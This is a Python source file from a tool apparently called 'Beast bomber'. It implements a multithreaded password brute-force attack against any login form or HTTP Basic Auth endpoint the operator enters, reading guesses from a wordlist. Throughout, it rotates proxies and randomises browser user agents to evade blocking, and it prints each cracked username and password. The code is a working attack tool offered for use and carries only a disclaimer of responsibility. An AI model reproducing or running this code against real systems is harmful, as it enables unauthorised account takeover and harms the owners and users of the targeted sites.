"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1ucm                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2024 un1ucm                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import os
import time
import fade
import ctypes
import random
import string
import urllib3
import requests
import threading
from sys import platform
from colorama import Fore, Style, Back, init
from core.etc.functions import logo_bruteforce, get_lang, get_proxies, randstr

urllib3.disable_warnings()
init()


class BruteForceAttack:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.todo = 0
        self.started = 0
        self.lock = threading.Lock()
        self.lang = get_lang()
        self.proxies = get_proxies()
        self.ua = requests.utils.default_headers()
        self.ua['User-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ВЗЛОМАНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'CRACKED: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    def brute_thread(self, target_url, username, password, login_field, pass_field, success_indicator, use_proxy, proxy=""):
        try:
            proxy_2 = ""
            if use_proxy == "y":
                if proxy == "":
                    proxy_2 = "http://" + random.choice(self.proxies) if self.proxies else ""
                else:
                    proxy_2 = proxy

            session = requests.Session()
            session.verify = False
            if proxy_2:
                session.proxies = {"http": proxy_2, "https": proxy_2}

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            data = {
                login_field: username,
                pass_field: password
            }

            response = session.post(target_url, data=data, headers=headers, timeout=10, allow_redirects=True)
            
            if success_indicator.lower() in response.text.lower() or response.url != target_url:
                with self.lock:
                    self.r = str(int(self.r) + 1)
                    print(Fore.GREEN + f"\n[+] CRACKED: {username}:{password}" + Fore.RESET)
                    self.stat()
            else:
                raise Exception("Login failed")

        except Exception:
            with self.lock:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

    def basic_auth_brute(self, target_url, username, password, use_proxy, proxy=""):
        try:
            proxy_2 = ""
            if use_proxy == "y":
                if proxy == "":
                    proxy_2 = random.choice(self.proxies) if self.proxies else ""
                else:
                    proxy_2 = proxy

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Authorization': 'Basic ' + requests.auth._basic_auth_str(username, password)
            }

            response = requests.get(target_url, headers=headers, timeout=10, proxies={"http": proxy_2, "https": proxy_2} if proxy_2 else None, verify=False)
            
            if response.status_code == 200:
                with self.lock:
                    self.r = str(int(self.r) + 1)
                    print(Fore.GREEN + f"\n[+] CRACKED BASIC AUTH: {username}:{password}" + Fore.RESET)
                    self.stat()
            else:
                raise Exception("Auth failed")

        except Exception:
            with self.lock:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

    def start_bruteforce(self):
        if platform == 'win32':
            os.system("cls")
        else:
            os.system("clear")

        logo_bruteforce()

        if self.lang == 'ru':
            text = "\nЦелевой URL > "
            text2 = """
╔══════════════════════════════════════════════╗
║  Поддерживаемые типы атаки:                  ║
║  1. Форма входа (POST запрос)                ║
║  2. Basic Auth заголовок                     ║
╚══════════════════════════════════════════════╝
            """
            text3 = "Тип атаки (1/2) > "
            text4 = "Логин > "
            text5 = "Путь к словарю > "
            text6 = "Имя поля логина > "
            text7 = "Имя поля пароля > "
            text8 = "Индикатор успеха (текст на странице) > "
            text9 = "Использовать прокси? (y/n) > "
            text10 = "Потоки > "
            text11 = "\n!НЕ РЕКОМЕНДУЕТСЯ!"
            text12 = "\nЗапустить потоки для каждой прокси? (y/n) > "
            text13 = 'поток запущен'
        else:
            text = "\nTarget URL > "
            text2 = """
╔══════════════════════════════════════════════╗
║  Supported attack types:                     ║
║  1. Login form (POST request)                 ║
║  2. Basic Auth header                         ║
╚══════════════════════════════════════════════╝
            """
            text3 = "Attack type (1/2) > "
            text4 = "Username > "
            text5 = "Wordlist path > "
            text6 = "Login field name > "
            text7 = "Password field name > "
            text8 = "Success indicator (page text) > "
            text9 = "Use proxies? (y/n) > "
            text10 = "Threads > "
            text11 = "\n!NOT RECOMMENDED!"
            text12 = "\nStart threads for every proxy? (y/n) > "
            text13 = 'thread started'

        print(fade.water(text2))

        target_url = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN).strip()
        if not target_url:
            return

        attack_type = input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN).strip()
        username = input(Fore.YELLOW + Style.BRIGHT + text4 + Fore.GREEN).strip()
        wordlist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'input', 'brutef.txt')
        wordlist_path = os.path.abspath(wordlist_path)

        if attack_type == '1':
            login_field = input(Fore.YELLOW + Style.BRIGHT + text6 + Fore.GREEN).strip()
            pass_field = input(Fore.YELLOW + Style.BRIGHT + text7 + Fore.GREEN).strip()
            success_indicator = input(Fore.YELLOW + Style.BRIGHT + text8 + Fore.GREEN).strip()
        else:
            success_indicator = "200"

        if not os.path.exists(wordlist_path):
            if self.lang == 'ru':
                print(Fore.RED + f"\nФайл словаря не найден по пути: {wordlist_path}" + Fore.RESET)
            else:
                print(Fore.RED + f"\nWordlist file not found at: {wordlist_path}" + Fore.RESET)
            time.sleep(2)
            return

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        if not self.proxies:
            use_proxy = 'n'
        else:
            use_proxy = input(Fore.YELLOW + Style.BRIGHT + text9 + Fore.GREEN).lower()

        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text10 + Fore.GREEN))

        if use_proxy == 'y':
            print(Back.RED + Fore.WHITE + text11 + Fore.RESET + Style.RESET_ALL)
            proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text12 + Fore.GREEN).lower()
        else:
            proxy_threads = 'n'

        th = None

        if attack_type == '1':
            if proxy_threads == 'y':
                for proxy in self.proxies:
                    for password in passwords[:self.todo]:
                        th = threading.Thread(target=self.brute_thread, args=(target_url, username, password, login_field, pass_field, success_indicator, use_proxy, proxy))
                        th.start()
                        self.started += 1
                        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                              Fore.YELLOW + Style.BRIGHT + text13)
            else:
                for password in passwords[:self.todo]:
                    th = threading.Thread(target=self.brute_thread, args=(target_url, username, password, login_field, pass_field, success_indicator, use_proxy))
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text13)
        else:
            if proxy_threads == 'y':
                for proxy in self.proxies:
                    for password in passwords[:self.todo]:
                        th = threading.Thread(target=self.basic_auth_brute, args=(target_url, username, password, use_proxy, proxy))
                        th.start()
                        self.started += 1
                        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                              Fore.YELLOW + Style.BRIGHT + text13)
            else:
                for password in passwords[:self.todo]:
                    th = threading.Thread(target=self.basic_auth_brute, args=(target_url, username, password, use_proxy))
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text13)

        time.sleep(1)

        if th:
            th.join()
